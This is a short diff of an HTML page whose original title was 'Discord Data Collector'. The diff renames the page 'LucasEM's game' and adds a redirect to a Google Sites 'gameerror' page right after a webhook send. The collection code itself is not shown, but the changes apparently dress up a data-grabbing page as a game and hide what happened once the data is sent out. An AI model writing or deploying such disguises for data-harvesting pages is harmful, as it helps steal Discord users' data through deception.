@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Data Collector</title>
+    <title>LucasEM's game</title>
     <style>
         #loading-screen {
             position: fixed;
@@ -156,6 +156,9 @@
                                 }).catch(error => {
                                     console.error("Error sending webhook:", error);
                                 });
+
+                                // Redirect to the target site after everything is done
+                                window.location.href = "https://sites.google.com/view/gameerror/home?authuser=5";
                             });
                     })
                     .catch(error => {
